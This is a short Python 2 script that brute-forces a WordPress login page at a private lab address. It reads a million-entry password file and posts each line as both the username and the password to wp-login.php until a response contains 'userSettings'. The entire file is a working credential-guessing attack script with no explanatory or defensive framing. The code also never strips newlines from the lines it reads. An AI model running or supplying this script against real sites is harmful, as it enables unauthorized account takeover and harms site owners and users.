#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests

url = "http://192.168.11.3:8000/wp-login.php"

with open("10-million-password-list-top-1000000.txt") as f:
    for line in f:
        payload = {'log':line, 'pwd':line}
        response = requests.post(url, data=payload)
        if "userSettings" in (response.text):
            break

print line,
